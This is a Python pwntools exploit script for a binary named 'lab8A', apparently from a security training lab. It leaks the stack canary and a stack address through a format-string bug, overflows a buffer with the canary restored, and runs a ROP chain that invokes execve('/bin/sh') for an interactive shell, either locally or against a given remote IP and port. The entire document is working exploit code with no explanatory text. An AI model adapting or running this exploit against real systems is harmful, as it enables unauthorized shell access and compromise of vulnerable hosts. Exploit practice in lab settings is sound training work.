#!/usr/bin/env python2

from pwn import *

# == How to use ==
# python remote.py LOCAL
# python remote.py REMOTE IP=127.0.0.1 PORT=1337

settings = {

    # Path to binary
    "binary"        : "./lab8A",

    # Path to custom libc
    "libc"          : None,
}

# Exploit here
def exploit():

    # Leak canary, stack and /bin/sh
    p.sendline("%130$p.%131$p./bin/sh")
    p.recvuntil("Last Name: ")
    canary = int(p.recvuntil(".", drop=True), 16)
    stack = int(p.recvuntil(".", drop=True), 16)
    binsh = stack - 0x43a
    log.info("Canary : {}".format(hex(canary)))
    log.info("Stack : {}".format(hex(stack)))
    log.info("/bin/sh : {}".format(hex(binsh)))

    # Overflow
    payload = ""
    payload = "A\x00/bin/sh\x00".ljust(0x200, "A")
    payload += p32(canary)
    payload += p32(0x1337) # EBP

    # ROP chain
    ropchain = []
    ropchain += [0x08058a19] # pop eax
    ropchain += [0xf]  # syscall - execve
    ropchain += [0x08064753] # dec eax
    ropchain += [0x08064753] # dec eax
    ropchain += [0x08064753] # dec eax
    ropchain += [0x08064753] # dec eax
    ropchain += [0x080481c9] # pop ebx
    ropchain += [binsh]  # /bin/sh string
    ropchain += [0x080e71c5] # pop ecx
    ropchain += [0]
    ropchain += [0x0806f22a] # pop edx
    ropchain += [0]
    ropchain += [0x08048ef6] # int 0x80

    payload += flat(ropchain) # RET
    p.sendline(payload)

    p.interactive()


# Initial setup
if __name__  == "__main__":

    binary = ELF(settings['binary'])
    p = None

    if settings['libc']:
        binary.libc = ELF(settings['libc'])


    if args['LOCAL']:
        p = process(binary.path)

    if args['REMOTE']:
        if not all([args.IP, args.PORT]):
            log.warning("Missing IP/PORT arguments.")
            exit()

        p = remote(args.IP, int(args.PORT))

    if not p:
        log.warning("Missing LOCAL/REMOTE argument.")
        exit()

    pause()
    exploit()
